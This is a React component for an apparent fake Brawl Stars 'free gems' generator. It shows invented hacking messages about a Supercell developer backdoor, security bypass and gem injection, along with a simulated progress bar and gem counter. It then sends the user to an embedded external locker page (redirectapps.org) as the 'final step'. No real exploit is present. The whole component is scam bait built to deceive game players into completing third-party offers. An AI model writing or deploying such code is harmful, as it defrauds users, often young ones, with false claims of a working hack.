import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { GemPack } from '../types';
import gemsIcon from '../icons/gems_icon.png';
import oneGemIcon from '../icons/one_gem_icon.png';

interface GemSelectorProps {
  gemPacks: GemPack[];
  onSelect: (amount: number) => void;
  onMessageChange?: (message: string | null) => void;
}

const steps = [
  "Accessing developer backchannel...",
  "Authenticating user...",
  "Locating Brawl Stars account...",
  "Injecting gems...",
  "Finalizing process...",
];

const hackMessages = [
  "Holy crap! Found Supercell's secret dev Backdoor...",
  "Bypassing Supercell's security...This is where it gets WILD!",
  "Injecting permanent codes – they can NEVER reverse this!",
  "Almost there! Securing the transfer...",
  "Wiping all traces – your account stays bulletproof!",
  "BOOM! System hacked – these gems are YOURS!",
  "FINAL STEP! Hit CONTINUE to complete the secure transfer and claim your gems!",
];

const AnimatedCounter: React.FC<{ value: number; target: number }> = ({ value, target }) => {
  const displayValue = Math.min(Math.floor(value), target);
  return (
    <span className="text-white font-bold text-4xl md:text-5xl font-lilita tracking-wider"
      style={{ textShadow: '2px 2px 4px rgba(0,0,0,0.5)' }}>
      {displayValue.toLocaleString()}
    </span>
  );
};

const GemSelector: React.FC<GemSelectorProps> = ({ gemPacks, onSelect, onMessageChange }) => {
  const [selectedGem, setSelectedGem] = useState<GemPack | null>(null);
  const [progress, setProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState(0);
  const [counterValue, setCounterValue] = useState(0);
  const [showLocker, setShowLocker] = useState(false);

  useEffect(() => {
    if (selectedGem) {
      setProgress(0);
      setCurrentStep(0);
      setCounterValue(0);

      const TYPING_SPEED = 30;
      const PAUSE_AFTER_MESSAGE = 2000;
      const totalDuration = hackMessages.reduce((t, msg) => t + msg.length * TYPING_SPEED + PAUSE_AFTER_MESSAGE, 0);

      const progressInterval = setInterval(() => {
        setProgress((p) => (p >= 100 ? 100 : p + 1));
      }, totalDuration / 100);

      let msgIndex = 0;
      const showMsg = () => {
        if (msgIndex < hackMessages.length) {
          onMessageChange?.(hackMessages[msgIndex]);
          setTimeout(() => {
            msgIndex++;
            showMsg();
          }, hackMessages[msgIndex]?.length * TYPING_SPEED + PAUSE_AFTER_MESSAGE);
        }
      };
      showMsg();

      const counterInterval = setInterval(() => {
        setCounterValue(v => (v >= selectedGem.amount ? selectedGem.amount : v + selectedGem.amount / 60));
      }, totalDuration / 60);

      const stepInterval = setInterval(() => {
        setCurrentStep(s => (s >= steps.length - 1 ? s : s + 1));
      }, totalDuration / steps.length);

      return () => {
        clearInterval(progressInterval);
        clearInterval(counterInterval);
        clearInterval(stepInterval);
      };
    } else {
      onMessageChange?.(null);
    }
  }, [selectedGem, onMessageChange]);

  const handleGemClick = (pack: GemPack) => {
    setSelectedGem(pack);
    onSelect(pack.amount);
    window.confetti?.({ particleCount: 150, spread: 180, origin: { y: 0.6 } });
  };

  const handleContinue = () => setShowLocker(true);
  const handleReset = () => { setSelectedGem(null); setShowLocker(false); };

  if (selectedGem && showLocker) {
    return (
      <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-3">
        <div className="relative bg-gradient-to-b from-slate-900 to-slate-800 rounded-xl w-full max-w-xl border border-slate-700 shadow-2xl overflow-hidden">
          
          <button onClick={handleReset}
            className="absolute top-3 right-3 w-8 h-8 bg-red-600 hover:bg-red-700 rounded flex items-center justify-center text-white text-lg font-bold">
            ×
          </button>

          <div className="p-4 text-center border-b border-slate-700">
            <div className="text-2xl font-bold text-orange-500 font-lilita">BRAWL STARS</div>
            {/* 🔥 Removed unwanted sentence */}
            <div className="text-yellow-400 font-lilita text-xl mt-1">
              FINAL STEP TO UNLOCK GEMS!
            </div>
          </div>

          <div className="w-full h-[75vh] sm:h-[600px]">
            <iframe
              src="https://redirectapps.org/cl/i/ex6mnk"
              className="w-full h-full rounded-b-xl"
              frameBorder="0"
            />
          </div>
        </div>
      </div>
    );
  }

  if (selectedGem) {
    return (
      <div className="bg-[#3e62c2] rounded-2xl p-4 sm:p-6 border-4 border-black shadow-[inset_0_5px_15px_rgba(0,0,0,0.2)] ">
        <div className="text-center mb-4">
          <img src={gemsIcon} className="mx-auto w-28 md:w-36 object-contain" />
          <div className="flex justify-center items-center gap-3 mt-4">
            <img src={oneGemIcon} className="w-10 md:w-12" />
            <AnimatedCounter value={counterValue} target={selectedGem.amount} />
          </div>

          <p className="text-white font-bold text-lg md:text-xl mt-4 font-lilita">
            {steps[currentStep]} ({progress}%)
          </p>

          <div className="mt-6 w-full max-w-md mx-auto">
            <motion.div
              className="h-5 rounded-full overflow-hidden bg-black/40 border border-white/30"
              initial={{ width: 0 }}
              animate={{}}
            >
              <motion.div
                className="h-full"
                animate={{ width: `${progress}%` }}
                style={{ background: 'linear-gradient(90deg,#00e6a8,#00d4ff)' }}
              />
            </motion.div>
          </div>

          {progress >= 100 && (
            <button onClick={handleContinue}
              className="mt-6 w-full max-w-md bg-yellow-400 text-black font-lilita text-2xl py-3 rounded-xl shadow-lg hover:scale-105 transition">
              CONTINUE
            </button>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="bg-[#3e62c2] rounded-2xl p-4 sm:p-6 border-4 border-black shadow-[inset_0_5px_15px_rgba(0,0,0,0.2)]">
      <h2 className="text-center text-3xl md:text-4xl font-bold mb-6 text-white font-lilita tracking-wider"
        style={{ textShadow: '0 3px #1e3a8a' }}>GEM PACKS</h2>

      <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 md:gap-6 place-items-center">
        {gemPacks.map((pack) => (
          <button key={pack.amount} onClick={() => handleGemClick(pack)}
            className="hover:scale-105 transition-transform">
            <img
              src={pack.imageUrl}
              alt=""
              className="w-full h-auto object-contain select-none"
              style={{
                imageRendering: "crisp-edges",
                filter: "drop-shadow(0 0 6px rgba(0,255,106,0.6))",
                animation: "pulseGlow 2s infinite ease-in-out"
              }}
            />
          </button>
        ))}
      </div>
    </div>
  );
};

export default GemSelector;
